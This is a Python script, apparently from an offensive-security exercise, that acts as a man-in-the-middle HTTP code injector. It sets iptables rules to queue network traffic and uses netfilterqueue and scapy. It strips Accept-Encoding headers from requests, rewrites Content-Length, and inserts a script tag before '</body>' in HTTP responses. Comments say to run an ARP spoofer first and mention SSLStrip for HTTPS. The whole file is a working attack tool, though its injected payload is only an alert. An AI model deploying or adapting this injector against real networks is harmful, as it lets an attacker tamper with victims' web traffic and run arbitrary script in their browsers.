#!/usr/bin/env python3
"""Use SSLStrip to use for https, SSLStrip works in port 10000"""

import netfilterqueue
import scapy.all as scapy
import subprocess
import re


def get_content_len(response_header):
    regex = "(?:(Content-Length:\s))(\d*)"
    original_len = re.search(regex, response_header)

    return int(original_len.group(2))


def recalculate_content_len(original, injection, key_word):
    new = original + len(injection) - len(key_word)
    return new


def modify_content_len(load, injection, key_word, is_ascii):
    """Detects the Cl of the load and modifies it"""

    if "Content-Type: text" in load and "Content-Length:" in load:  # If it has length and its text
        print("With html content type, CHANGING LEN")

        length = get_content_len(load)
        print("Original len: " + str(length))
        new_length = recalculate_content_len(length, injection, key_word)
        print("New len: " + str(new_length))

        if is_ascii:
            new_load = re.sub("(?<=Content-Length: )[^.\\r\\n]*", str(new_length), load)
            return new_load
        else:
            new_load = re.sub(str(length), str(new_length), load)
            return new_load
    else:
        print("No es html!! o no es necesario cambiar lenght")
        return load


def set_load(s_packet, load):
    """Modifies the load of the scapy packet passed to the load"""

    s_packet[scapy.Raw].load = load
    del s_packet[scapy.IP].len
    del s_packet[scapy.IP].chksum
    del s_packet[scapy.TCP].chksum

    return s_packet


def get_load(scapy_packet):
    try:
        load = scapy_packet[scapy.Raw].load.decode("utf-8")  # Errors when non ascii chars in the packets!
        print("Ascii")
    except UnicodeDecodeError:
        print("No asci")
        is_ascii = False
        load = str(scapy_packet[scapy.Raw].load)
        load = re.search("(?<=b')[^'*]*", load).group(0)
        print(load)

    return load


def process_packet(packet):
    """When a packet arrives this function is called"""

    is_ascii = True
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):  # IF has raw data...
        if scapy_packet[scapy.TCP].dport == 80:
            load = scapy_packet[scapy.Raw].load

            regex = "Accept-Encoding:.*?\\r\\n"
            new_load = re.sub(regex, "", load.decode("utf-8"))  # Not accept encoding so receive http data in plain text
            mod_packet = set_load(scapy_packet, new_load)
            packet.set_payload(bytes(mod_packet))

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response packet")
            injection = "<script>alert('Hola');</script></body>"
            key_word = "</body>"

            load = get_load(scapy_packet)

            if "HTTP/" in load:  # If it is a header packet:
                new_load = modify_content_len(load, injection, key_word, is_ascii)

                mod_packet = set_load(scapy_packet, new_load)

                packet.set_payload(bytes(mod_packet))
                load = scapy_packet[scapy.Raw].load.decode("utf-8")

            if "</body>" in load:
                new_load = load.replace("</body>", injection)
                mod_packet = set_load(scapy_packet, new_load)
                packet.set_payload(bytes(mod_packet))

    packet.accept()


try:
    # Execute first the arp spoofer
    # To test with this computer: iptables -I OUTPUT -j NFQUEUE --queue-num 0;
    #                             iptables -I INPUT -j NFQUEUE --queue-num 0;
    # trap the incoming packets to a queue that come from other computers while mitm:
    # iptables -I FORDWARD -j queue-num 0
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0;", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

    # Remember to delete iptables wih iptables --flush
except KeyboardInterrupt:
    print("closing code injector")
    subprocess.call("iptables --flush", shell=True)
